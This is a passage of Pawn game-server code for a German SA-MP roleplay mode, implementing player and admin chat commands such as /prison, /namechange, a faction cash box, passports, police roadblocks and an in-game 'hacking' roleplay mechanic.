	        SendClientMessage(playerid, COLOR_GRAD1, "Du darfst diesen Befehl nicht benutzen!");
			return 1;
		}
		if(IsPlayerInAnyVehicle(playerid))
		{
		    SetVehicleToRespawn(GetPlayerVehicleID(playerid));
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GRAD1, "Du bist in keinem Fahrzeug!");
		}
		return 1;
	}
	if(strcmp(cmdtext,"/showme",true)==0)
	{
		if(PlayerInfo[playerid][pAdmin] >= 1338)
		{
			ShowPlayerDialog(playerid, DIALOG_SHOWME, DIALOG_STYLE_LIST, "Showme Farben", "Gelb\nRot\nGrün\nBlau\nPink\nSchwarz\nUnsichtbar", "Auswählen", "Abbrechen");
			return 1;
		}
		if(ShowMeAllowed == 1)
		{
			ShowPlayerDialog(playerid, DIALOG_SHOWME, DIALOG_STYLE_LIST, "Showme Farben", "Gelb\nRot\nGrün\nBlau\nPink\nSchwarz\nUnsichtbar", "Auswählen", "Abbrechen");
			return 1;
		}
		else
		{
  			SendClientMessage(playerid,COLOR_LIGHTRED,"Der Befehl wurde deaktiviert!");
		    return 1;
		}
	}
	if(strcmp(cmdtext,"/help",true) == 0)
	{
	//	ShowPlayerDialog(playerid, DIALOG_HILFE, DIALOG_STYLE_LIST, "{FFFFFF}Die Hilfe", "Allgemeine Befehle 1\nAllgemeine Befehle 2\nAllgemeine Befehle 3\nAllgemeine Befehle 4\nJobbefehle\nFraktionsbefehle\nSonstiges\nDonator\nServer-Informationen\nTeamspeak\nGangfight\nHilfe! Ich bin Verbuggt!", "Auswählen", "Abbrechen");
	ShowPlayerDialog(playerid, DIALOG_HILFE, DIALOG_STYLE_LIST, "{FFFFFF}Die Hilfe", "Allgemeine Befehle 1\nAllgemeine Befehle 2\nAllgemeine Befehle 3\nAllgemeine Befehle 4\nJobbefehle\nFraktionsbefehle\nSonstiges\nDonator\nServer-Informationen\nTeamspeak\nGangfight\nFAQ", "Auswählen", "Abbrechen");
		return 1;
	}
    if(strcmp(cmd,"/namechange",true) == 0)
    {
        if(PlayerInfo[playerid][pAdmin] >= 2002)
        {
            tmp = strtoknew(cmdtext,idx);
            if(!strlen(tmp))
            {
                SCM(playerid,COLOR_WHITE,"NUTZUNG: /namechange [playerid/name] [neuer name]    Achtung! Maximale Länge: 16 Zeichen");
                return 1;
            }
            giveplayerid = ReturnUser(tmp);
            if(!IsPlayerConnected(giveplayerid))
            {
                SCM(playerid,COLOR_WHITE," Spieler ist nicht Online!");
                return 1;
            }
            new length = strlen(cmdtext);
            while ((idx < length) && (cmdtext[idx] <= ' '))
            {
                idx++;
            }
            new offset = idx;
            new result[64];
            while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
            {
                result[idx - offset] = cmdtext[idx];
                idx++;
            }
            result[idx - offset] = EOS;
            if(strlen(result) < 1 || strlen(result) > 24)
            {
                SCM(playerid,COLOR_WHITE,"NUTZUNG: /namechange [playerid/name] [neuer name] Achtung! Maximale Länge: 24 Zeichen");
                return 1;
            }
            format(string,sizeof(string),"AdmCmd: %s hat %s in %s umbenannt!",GetName(playerid),GetName(giveplayerid),result);
            ABroadCast(COLOR_LIGHTRED,string,1);
            format(string,sizeof(string),"AdmCmd: %s hat dich in %s umbenannt!",GetName(playerid),result);
            SCM(giveplayerid,COLOR_YELLOW,string);
            SetPlayerName(giveplayerid,result);
        }
        return 1;
    }
    if(strcmp(cmdtext, "/quitquiz",true) == 0)
    {
        if(PlayerInfo[playerid][pAdmin] >= 3)
        {
		    if(active_quiz == 0)
		    {
	            SendClientMessage(playerid, COLOR_RED, "Es ist kein Quiz aktiv!");
	            return 1;
	        }
	        else
	        {
	            new textstringd[256];
	            format(textstringd,sizeof(textstringd),"Admin %s hat das Quiz beendet! Frage: %s",GetName(playerid),ServerFrage);
	            SendClientMessageToAll(COLOR_LIGHTBLUE,textstringd);// /duty Sound von RPG Busfhrer
				active_quiz = 0;
	            return 1;
	        }
		}
	    else
	    {
	        SendClientMessage(playerid, COLOR_RED, "   Du bist kein Admin !");
	        return 1;
	    }
    }
    if(strcmp(cmdtext, "/quiz",true) == 0)
    {
        if(PlayerInfo[playerid][pAdmin] >= 3)
        {

		    if(active_quiz == 0)
		    {
     	       ShowPlayerDialog(playerid, DIALOG_QUIZ_QUESTION, DIALOG_STYLE_INPUT, "Neues Quiz", "Frage eingeben [1 von 3]\nGib eine Frage ein", "Weiter", "Abbrechen");
	        }
	        else
	        {
	            SendClientMessage(playerid, COLOR_RED, "Es ist bereits ein Quiz aktiv! Verwende: /quitquiz");
	            return 1;
	        }
        }
        else
        {
            SendClientMessage(playerid, COLOR_RED, "   Du bist kein Admin !");
            return 1;
        }
        return 1;
    }



    if(strcmp(cmd, "/prison",true) == 0)
	{
	       if(PlayerInfo[playerid][pAdmin] >= 4)
	        {
        	tmp = strtoknew(cmdtext, idx);
        	if(!strlen(tmp))
        	{
            	SendClientMessage(playerid, COLOR_RED, "FEHLER: /prison [playerid][Minuten][Grund]");
            	return 1;
        	}
        	giveplayerid = ReturnUser(tmp);

        	tmp = strtoknew(cmdtext, idx);
        	if(!tmp[0])return SendClientMessage(playerid, COLOR_RED, "FEHLER: /prison [playerid][Minuten][Grund]");
			new Minutes = strval(tmp);
        	tmp = strtoknew(cmdtext, idx);
        	if(!tmp[0])return SendClientMessage(playerid, COLOR_RED, "FEHLER: /prison [playerid][Minuten][Grund]");
			if(IsPlayerConnected(giveplayerid))
        	{
            	if(giveplayerid != INVALID_PLAYER_ID)
            	{
	     		    if(PlayerInfo[playerid][pAdmin] >= 2005)
	        		{
                	GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                	GetPlayerName(playerid, sendername, sizeof(sendername));
			        format(string,sizeof(string),"UC-Admin hat %s für %d Minuten ins Prison teleportiert, Grund: %s",giveplayer,Minutes,tmp);
                    SendClientMessageToAll(COLOR_RED,string);
			        GameTextForPlayer(giveplayerid, "~w~Willkommen im ~n~~r~Prison", 5000, 3);
		        	ResetPlayerWeapons(giveplayerid);
			        SetPlayerInterior(giveplayerid,1);
    		        SetPlayerPos(giveplayerid, 2144.1028,1635.3062,993.5761);
                    PlayerInfo[giveplayerid][pPrison] = 1;
                    PlayerInfo[giveplayerid][pJailTime] = Minutes;
                    AntiAdminAbuse[playerid]++;
					if(Minutes == 0)
            		{
						ReleasePlayerFromJail(giveplayerid);
         			}
					return 1;
    	        	}
                	GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                	GetPlayerName(playerid, sendername, sizeof(sendername));
			        format(string,sizeof(string),"%s hat %s für %d Minuten ins Prison teleportiert, Grund: %s",sendername,giveplayer,Minutes,tmp);
                    SendClientMessageToAll(COLOR_RED,string);
			        GameTextForPlayer(giveplayerid, "~w~Willkommen im ~n~~r~Prison", 5000, 3);
		        	ResetPlayerWeapons(giveplayerid);
			        SetPlayerInterior(giveplayerid,1);
    		        SetPlayerPos(giveplayerid, 2144.1028,1635.3062,993.5761);
                    PlayerInfo[giveplayerid][pPrison] = 1;
                    PlayerInfo[giveplayerid][pJailTime] = Minutes;
                    AntiAdminAbuse[playerid]++;
					if(Minutes == 0)
            		{
						ReleasePlayerFromJail(giveplayerid);
         			}
            	}
        	}
        	else
        	{
            	SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Admin !");
            	return 1;
        	}
    	}
    	return 1;
	}
    if(strcmp(cmd, "/w", true) == 0 || strcmp(cmd, "/whisper", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(gPlayerLogged[playerid] == 0)
            {
                SCM(playerid, COLOR_GREY, "   Du must eingelogt sein !");
                return 1;
            }
            if(PlayerInfo[playerid][pAdmin] <= 0) return 1;
            tmp = strtoknew(cmdtext, idx);
            if(!strlen(tmp))
            {
                SCM(playerid, COLOR_GRAD2, "NUTZUNG: (/w)isper [SpielerID/GetName] [whisper text]");
                return 1;
            }
            giveplayerid = ReturnUser(tmp);
            if (IsPlayerConnected(giveplayerid))
            {
                if(giveplayerid != INVALID_PLAYER_ID)
                {
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                    if(giveplayerid == playerid)
                    {
                    }
                    new length = strlen(cmdtext);
                    while ((idx < length) && (cmdtext[idx] <= ' '))
                    {
                        idx++;
                    }
                    new offset = idx;
                    new result[64];
                    while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
                    {
                        result[idx - offset] = cmdtext[idx];
                        idx++;
                    }
                    result[idx - offset] = EOS;
                    if(!strlen(result))
                    {
                        SCM(playerid, COLOR_GRAD2, "NUTZUNG: (/w)isper [SpielerID/GetName] [whisper text]");
                        return 1;
                    }
          		    if(PlayerInfo[playerid][pAdmin] >= 2005)
   			        {
                    format(string, sizeof(string), "UC-Admin sagt dir: %s",  (result));
                    SCM(giveplayerid, COLOR_LIGHTBLUE, string);
                    format(string, sizeof(string), "Nachricht gesendet %s(ID %d) %s.", giveplayer, giveplayerid,(result));
                    SCM(playerid,  COLOR_LIGHTBLUE, string);
					return 1;
      			    }
                    format(string, sizeof(string), "Admin %s(ID: %d) sagt dir: %s", sendername, playerid, (result));
                    SCM(giveplayerid, COLOR_LIGHTBLUE, string);
                    format(string, sizeof(string), "Nachricht gesendet %s(ID %d) %s.", giveplayer, giveplayerid,(result));
                    SCM(playerid,  COLOR_LIGHTBLUE, string);
                    return 1;
                }
            }
            else
            {
            	format(string, sizeof(string), "   %d ist nicht online", giveplayerid);
                SCM(playerid, COLOR_GRAD1, string);
            }
        }
        return 1;
    }
	if(strcmp(cmd,"/fkasse",true) == 0)
	{
	    new fraktion = 0;
	    if(PlayerInfo[playerid][pMember] > 0) fraktion = PlayerInfo[playerid][pMember] - 1;
	    if(PlayerInfo[playerid][pLeader] > 0) fraktion = PlayerInfo[playerid][pLeader] - 1;
		if(fraktion > 0)
		{
		    tmp = strtoknew(cmdtext,idx);
		    if(!strlen(tmp))
		    {
				SendClientMessage(playerid,COLOR_GRAD5," /fkasse [einzahlen] [Betrag]");
				format(string,sizeof(string)," Derzeit sind $%d in der Fraktionskasse!",FraktionsKasse[fraktion]);
				SendClientMessage(playerid,COLOR_GRAD5,string);
				return 1;
			}
			if(strcmp(tmp,"einzahlen",true) == 0)
			{
			    tmp = strtoknew(cmdtext,idx);
			    if(!strlen(tmp))
			    {
					SendClientMessage(playerid,COLOR_GRAD5," /fkasse einzahlen [Betrag]");
					format(string,sizeof(string)," Derzeit sind $%d in der Fraktionskasse!",FraktionsKasse[fraktion]);
					SendClientMessage(playerid,COLOR_GRAD5,string);
					return 1;
				}
				new amount = strval(tmp);
				if(amount < 0 || amount > 1000000) return SendClientMessage(playerid,COLOR_WHITE," Bitte nur Summen in Höhe von 1 bis 1 Million Dollar!");
				if(GetPlayerMoneySave(playerid) < amount) return SendClientMessage(playerid,COLOR_WHITE," Du hast nicht soviel Geld um es einzuzahlen!");
				FraktionsKasse[fraktion] += amount;
				GivePlayerMoneySave(playerid,-amount);
				format(string,sizeof(string)," Du hast $%d in die Fraktionskasse eingezahlt! Total: $%d",amount,FraktionsKasse[fraktion]);
				SendClientMessage(playerid,COLOR_WHITE,string);
				format(string,sizeof(string)," %s hat $%d in die Fraktionskasse eingezahlt! Total: $%d",sendername,amount,FraktionsKasse[fraktion]);
				SendLeaderMSG(fraktion+1,COLOR_LIGHTBLUE,string);
				SaveFraktionsKassen();
				Log("F-Kasse-Log.txt",string);
			}
/*
			else if(strcmp(tmp,"auszahlen",true) == 0)
			{
			    tmp = strtoknew(cmdtext,idx);
			    if(!strlen(tmp))
			    {
					SendClientMessage(playerid,COLOR_GRAD5," /fkasse auszahlen [Betrag]");
					format(string,sizeof(string)," Derzeit sind $%d in der Fraktionskasse!",FraktionsKasse[fraktion]);
					SendClientMessage(playerid,COLOR_GRAD5,string);
					return 1;
				}
				new amount = strval(tmp);
				if(PlayerInfo[playerid][pLeader] == 0) return SendClientMessage(playerid,COLOR_WHITE," Nur Leader dürfen Geld aus der Fraktionskasse nehmen!");
				if(amount < 0 || amount > 1000000) return SendClientMessage(playerid,COLOR_WHITE," Bitte nur Summen in Höhe von 1 bis 1 Million Dollar!");
				if((FraktionsKasse[fraktion] - amount) < 0) return SendClientMessage(playerid,COLOR_WHITE," Du kannst keine Schulden machen!");
				FraktionsKasse[fraktion] -= amount;
				GivePlayerMoneySave(playerid,amount);
				format(string,sizeof(string)," Du hast $%d aus der Fraktionskasse genommen! Total: $%d",amount,FraktionsKasse[fraktion]);
				SendClientMessage(playerid,COLOR_WHITE,string);
				format(string,sizeof(string)," %s hat $%d aus der Fraktionskasse genommen! Total: $%d",sendername,amount,FraktionsKasse[fraktion]);
				SendLeaderMSG(fraktion+1,COLOR_LIGHTBLUE,string);
				SaveFraktionsKassen();
				Log("F-Kasse-Log.txt",string);
			}
*/
			else
			{
				SendClientMessage(playerid,COLOR_GRAD5," /fkasse [einzahlen] [Betrag]");
				format(string,sizeof(string)," Derzeit sind $%d in der Fraktionskasse!",FraktionsKasse[fraktion]);
				SendClientMessage(playerid,COLOR_GRAD5,string);
			}
		}
		else SendClientMessage(playerid,COLOR_WHITE," Du bist in gar keiner Fraktion!");
		return 1;
	}
/*
	if(strcmp(cmd,"/setfkasse",true) == 0)
	{
	    if(PlayerInfo[playerid][pAdmin] >= 2002)
	    {
			tmp = strtoknew(cmdtext,idx);
	        if(!strlen(tmp))
	        {
				SendClientMessage(playerid,COLOR_GRAD5," /setfkasse [FraktionsID] [Betrag]");
				return 1;
			}
			new fraktion = strval(tmp);
			if(fraktion < 0 || fraktion > 24) return SendClientMessage(playerid,COLOR_WHITE," Diese Fraktion gibt es nicht!");
			tmp = strtoknew(cmdtext,idx);
	        if(!strlen(tmp))
	        {
	            format(string,sizeof(string)," /setfkasse %d [Betrag]",fraktion);
				SendClientMessage(playerid,COLOR_GRAD5,string);
				return 1;
			}
			new amount = strval(tmp);
			if(amount < 0 || amount > 1000000) return SendClientMessage(playerid,COLOR_WHITE," Bitte nur Summen in Höhe von 1 bis 1 Million Dollar!");
			format(string,sizeof(string)," %s hat die Fraktionskasse von %s auf $%d gesetzt!",sendername,Fracs[(fraktion-1)],amount);
			ABroadCast(COLOR_LIGHTRED,string,1337);
			FraktionsKasse[(fraktion-1)] = amount;
		}
		return 1;
	}
*/
	if(strcmp(cmd, "/hack", true) == 0)
	{
		if(IsPlayerConnected(playerid))
		{
			if(PlayerCuffed[playerid])
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Du wurdest Verhaftet. Du kannst nicht Hacken!");
				return 1;
			}
			new hackcar = GetPlayerVehicleID(playerid);
			if(GetVehicleModel(hackcar) == 596 && IsPlayerInAnyVehicle(playerid))
			{
				if(WantedLevel[playerid]>=1)
				{
					SendClientMessage(playerid, COLOR_ALLDEPT, "Du fängst an zu Hacken, bleib 2 Minuten im Auto.");
					TogglePlayerControllable(playerid,0);
				 	hacken[playerid] = SetTimerEx("hack", 120000, 0, "d", playerid);
				 	format(string, sizeof(string), "* %s fängt an den Polizei-Computer zu hacken!", sendername);
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Du hast keine Wanteds!");
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Du bist in keinem Einsatzfahrzeug!");
				return 1;
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/givepass", true) == 0)
	{
        if(PlayerInfo[playerid][pLeader] == 7 || PlayerInfo[playerid][pAdmin] >= 4)
        {
            new x_nr[256];
			x_nr = strtoknew(cmdtext, idx);
			if(!strlen(x_nr))
			{
				SendClientMessage(playerid, COLOR_WHITE, "|_______________ Vergabe von Pässen _______________|");
				SendClientMessage(playerid, COLOR_WHITE, "BEBenutzung: /givepass [passname] [playerid/Name]");
		  		SendClientMessage(playerid, COLOR_GREY, "Verfügbare Namen: sfpass, lvpass");
				SendClientMessage(playerid, COLOR_WHITE, "|_________________________________________________________|");
				return 1;
			}
		    if(strcmp(x_nr,"sfpass",true) == 0)
			{
	            tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
				    SendClientMessage(playerid, COLOR_WHITE, "BENUTZUNG: /givepass sfpass [playerid/Name]");
				    return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
				        GetPlayerName(playerid, sendername, sizeof(sendername));
				        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
			            format(string, sizeof(string), "* Du hast %s den SF-Pass gegeben.",giveplayer);
				        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				        format(string, sizeof(string), "* San Andreas Präsident %s hat dir den SF-Pass gegeben.",sendername);
				        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				        PlayerInfo[giveplayerid][pSFPASS] = 1;
				        return 1;
			        }
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist Offline !");
				    return 1;
				}
			}
			if(strcmp(x_nr,"lvpass",true) == 0)
			{
	            tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
				    SendClientMessage(playerid, COLOR_WHITE, "BENUTZUNG: /givepass lvpass [playerid/Name]");
				    return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
				        GetPlayerName(playerid, sendername, sizeof(sendername));
				        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
			            format(string, sizeof(string), "* Du hast %s den LV-Pass gegeben.",giveplayer);
				        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				        format(string, sizeof(string), "* San Andreas Präsident %s hat dir den LV-Pass gegeben.",sendername);
				        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
          				PlayerInfo[giveplayerid][pLVPASS] = 1;
				        return 1;
			        }
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist Offline !");
				    return 1;
				}
			}
    	}
     	else
      	{
       		SendClientMessage(playerid, COLOR_GREY, "   Sie sind nicht der San Andreas Präsident !");
       		return 1;
	    }
	    return 1;
	}
	if(strcmp(cmd, "/takepass", true) == 0)
	{
        if(PlayerInfo[playerid][pLeader] == 7)
        {
            new x_nr[256];
			x_nr = strtoknew(cmdtext, idx);
			if(!strlen(x_nr))
			{
				SendClientMessage(playerid, COLOR_WHITE, "|_______________ Entzug von Pässen _______________|");
				SendClientMessage(playerid, COLOR_WHITE, "BENUTZUNG: /takepass [passname] [playerid/Name]");
		  		SendClientMessage(playerid, COLOR_GREY, "Verfügbare Namen: sfpass, lvpass");
				SendClientMessage(playerid, COLOR_WHITE, "|_________________________________________________________|");
				return 1;
			}
		    if(strcmp(x_nr,"sfpass",true) == 0)
			{
			    tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp)) {
					SendClientMessage(playerid, COLOR_WHITE, "BENUTZUNG: /takepass sfpass [playerid/Name]");
					return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
				        if (ProxDetectorS(8.0, playerid, giveplayerid))
						{
					        format(string, sizeof(string), "* Du hast %s den SF-Pass entzogen.", giveplayer);
					        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "* San Andreas Präsident %s hat dir den SF-Pass entzogen.", sendername);
					        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        PlayerInfo[giveplayerid][pSFPASS] = 0;
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist nicht in deiner Nähe !");
						    return 1;
						}
				    }
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist Offline !");
				    return 1;
				}
			}
			if(strcmp(x_nr,"lvpass",true) == 0)
			{
			    tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp)) {
					SendClientMessage(playerid, COLOR_WHITE, "BENUTZUNG: /takepass lvpass [playerid/Name]");
					return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
				        if (ProxDetectorS(8.0, playerid, giveplayerid))
						{
					        format(string, sizeof(string), "* Du hast %s den LV-Pass entzogen.", giveplayer);
					        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "* San Andreas Präsident %s hat dir den LV-Pass entzogen.", sendername);
					        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        PlayerInfo[giveplayerid][pLVPASS] = 0;
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist nicht in deiner Nähe !");
						    return 1;
						}
				    }
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist Offline !");
				    return 1;
				}
			}
	    }
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "   Sie sind nicht der San Andreas Präsident !");
			return 1;
		}
	    return 1;
	}
 	if(strcmp(cmdtext, "/NeedHelp", true)==0 || strcmp(cmdtext, "/USGA", true)==0)
	{
		if(IsPlayerConnected(playerid))
		{
			if(IsACop(playerid))
			{
			    if(PlayerInfo[playerid][pGangJailed] == 1 || PlayerTied[playerid] >= 1)
			    {
			        SendClientMessage(playerid, COLOR_GRAD1, "Du kannst jetzt nicht einen Backup rufen!");
					return 1;
				}
				new Float:X, Float:Y, Float:Z;
				GetPlayerPos(playerid, X, Y, Z);
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string,sizeof(string),"  HQ: %s braucht dringend Hilfe!",sendername);
				for(new i=0; i<GetMaxPlayers(); i++)
				{
				    if(IsACop(i))
				    {
						SendClientMessage(i, F_G, "=============================================================");
						SendClientMessage(i, F_O, "  HQ: AN ALLE VERFÜGBAREN EINHEITEN:");
						SendClientMessage(i, F_O, string);
						SendClientMessage(i, F_O, "  HQ: Begeben Sie sich zum Roten Marker auf der Karte!");
						SendClientMessage(i, F_G, "=============================================================");
						SetPlayerCheckpoint(i, X, Y, Z-5, 3.0);
					}
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du bist kein Staatsbeamter!");
			}
		}
		return 1;
	}
	if (strcmp("/starten", cmd, true) == 0)
	{
		if(Mullabfuhr[playerid] == 0 && PlayerInfo[playerid][pJob] == 17)
		{
		    if(PlayerInfo[playerid][pMulltime] == 0)
		    {
				if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 408)
		    	{
					SendClientMessage(playerid, COLOR_LIGHTGREEN, "Du bist nun im Dienst, fahre nun zu den einzelnen Häusern und Geschäften!");
					SetPlayerCheckpoint(playerid, 1355.6742,-1749.4160,13.3807, 5.0);
		        	MullabfuhrCP[playerid] = 1;
		        	Mullabfuhr[playerid] = 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_RED, "Du bist nicht im Müllwagen, oder hast bereits eine Runde gestartet!");
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_RED, "Du musst warten bis du wieder fahren kannst!");
			}
			return 1;
		}
	}
	if(strcmp(cmd,"/rmarker",true) == 0)
	{
		if(IsPlayerInFrac(playerid,4) && MedicCallTime[playerid] > 0)
		{
			MedicCallTime[playerid] = 0;
			PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
			GameTextForPlayer(playerid, "~r~Markierung aufgehoben", 2500, 1);
		}
        if(IsPlayerInFrac(playerid,1) && CopCallTime[playerid] > 0)
	    {
			CopCallTime[playerid] = 0;
			PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
			GameTextForPlayer(playerid, "~r~Markierung aufgehoben", 2500, 1);
	    }
		if(IsPlayerInFrac(playerid,22) && FireCallTime[playerid] > 0)
		{
			FireCallTime[playerid] = 0;
			PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
			GameTextForPlayer(playerid, "~r~Markierung aufgehoben", 2500, 1);
		}
		if(IsPlayerInFrac(playerid,24))
		{
			PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
			GameTextForPlayer(playerid, "~r~Markierung aufgehoben", 2500, 1);
		}
		if(PlayerInfo[playerid][pLeader] == 24 || PlayerInfo[playerid][pMember] == 24)
		{
            MechanicCallTime[playerid] = 0;
			PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
			GameTextForPlayer(playerid, "~r~Markierung aufgehoben", 2500, 1);
		}
		DisablePlayerCheckpoint(playerid);
		return 1;
	}
	//-------------------------------Roadblock----------------------------------------------
	if(strcmp(cmdtext, "/nagelband", true) == 0 || strcmp(cmdtext, "/nb", true) == 0)
	{
	    if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Cop!");
	    if(PlayerInfo[playerid][pRank] < 3)
	    {
	        SendClientMessage(playerid, COLOR_GRAD1, "Du musst mindestens Rang 3 haben, um diesen Befehl nutzen zu können!");
	        return 1;
		}
		if(NagelBandErstellt[playerid] == 4)
		{
		    SendClientMessage(playerid, COLOR_GRAD1, "Du hast bereits ein Nagelband aufgestellt, bau sie erst wieder ab (/nbw)");
		    return 1;
		}
		AddNagelBand(playerid);
		NagelBandErstellt[playerid] = 1;
		SendClientMessage(playerid, COLOR_LIGHTGREEN, "Nagelband aufgestellt (Abbauen mit /nbw).");
		return 1;
	}
	if(strcmp(cmdtext, "/nagelbandweg", true) == 0 || strcmp(cmdtext, "/nbw", true) == 0)
	{
 		if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Cop!");
 		if(NagelBandErstellt[playerid] == 4)
 		{
 		    SendClientMessage(playerid, COLOR_GRAD1, "Du hast kein Nagelband aufgestellt!");
 		    return 1;
		}
		RemoveNagelBand(playerid);
		return 1;
	}
	if(strcmp(cmdtext, "/nagelbandwegall", true) == 0 || strcmp(cmdtext, "/nbwa", true) == 0)
	{
	    if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Cop!");
		if(PlayerInfo[playerid][pRank] < 3)
		{
	        SendClientMessage(playerid, COLOR_GRAD1, "Du musst mindestens Rang 3 haben, um diesen Befehl nutzen zu können!");
	        return 1;
		}
		SendClientMessage(playerid, COLOR_LIGHTGREEN, "Alle Nagelbänder abgebaut.");
        RemoveAllNagelBand();
        for(new i = 0; i < MAX_PLAYERS; i++)
        {
            if(NagelBandErstellt[i] == 1)
            {
                NagelBandErstellt[i] = 0;
                SendClientMessage(playerid, COLOR_LIGHTGREEN, "Alle Nagelbänder wurden abgebaut!");
			}
		}
        return 1;
	}
	if(strcmp(cmdtext, "/roadblock", true)==0 || strcmp(cmdtext, "/rb", true)==0)
	{
		if (!IsACop(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Du bist kein Cop!");
		if (PlayerInfo[playerid][pRank] < 1)
		{
			SendClientMessage(playerid, COLOR_GREY, "Du musst mindestens Rang 1 haben, um diesen Befehl nutzen zu können!");
			return 1;
		}
		if (PlayerInfo[playerid][pRoadblock] != 0) return SendClientMessage(playerid, COLOR_GREY, "Du kannst nur eine Straßensperre errichten, gib /rrb ein um eine vorhandene Sperre zu entfernen.");
		new Float:X, Float:Y, Float:Z, Float:A;
		GetPlayerPos(playerid, X, Y, Z);
		GetPlayerFacingAngle(playerid, A);
		PlayerInfo[playerid][pRoadblock] = CreateDynamicObject(981, X, Y, Z, 0.0, 0.0, A+180);
		SetPlayerPos(playerid, X, Y, Z+4);
		GameTextForPlayer(playerid, "~w~Strassensperre ~r~platziert", 5000, 5);
		SendClientMessage(playerid, COLOR_GREEN, "Starßensperre erfolgreich platziert, gib /rrb oder /roadunblock ein um sie zu entfernen.");
		//roadblocktimer = 1;
		GetPlayerName(playerid, sendername, sizeof(sendername));
		format(string, sizeof(string), "HQ: Officer %s hat eine Straßensperre platziert, auf der Karte ist sie als Checkpoint zu sehen.", sendername);
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(IsPlayerConnected(i))
			{
				if(IsACop(i))
				{
					SetPlayerCheckpoint(playerid, X, Y, Z-10, 1.0);
					SendClientMessage(i, TEAM_BLUE_COLOR, string);
					if (PlayerInfo[i][pRank] >= 5 && PlayerInfo[i][pMember] || PlayerInfo[i][pLeader] == 1)
					{
						SendClientMessage(i, COLOR_YELLOW, "Du kannst alle Sperren mit /rrball entfernen");
					}
				}
			}
		}
		return 1;
	}
/*
	if(strcmp(cmdtext, "/member", true)==0)
	{
		if(PlayerInfo[playerid][pMember] > 0)
		{
			SendClientMessage(playerid, COLOR_YELLOW, "===[Aus deiner Fraktion ist Online: ]===");
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i))
				{
					new mymember;
					mymember = PlayerInfo[playerid][pMember];
					new myleader;
					myleader = PlayerInfo[playerid][pMember];
					if(PlayerInfo[i][pMember] == mymember || PlayerInfo[i][pLeader] == myleader)
					{
						GetPlayerName(i, sendername, sizeof(sendername));
						format(string, sizeof(string), "* %s [ID:%d][Rang:%d]", sendername,i,PlayerInfo[i][pRank]);
						SendClientMessage(playerid, COLOR_WHITE, string);
					}
				}
			}
			return 1;
		}
		if(PlayerInfo[playerid][pLeader] > 0)
		{
			SendClientMessage(playerid, COLOR_YELLOW, "===[Aus deiner Fraktion ist Online: ]===");
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i))
				{
					new mymember;
					mymember = PlayerInfo[playerid][pLeader];
					new myleader;
					myleader = PlayerInfo[playerid][pLeader];
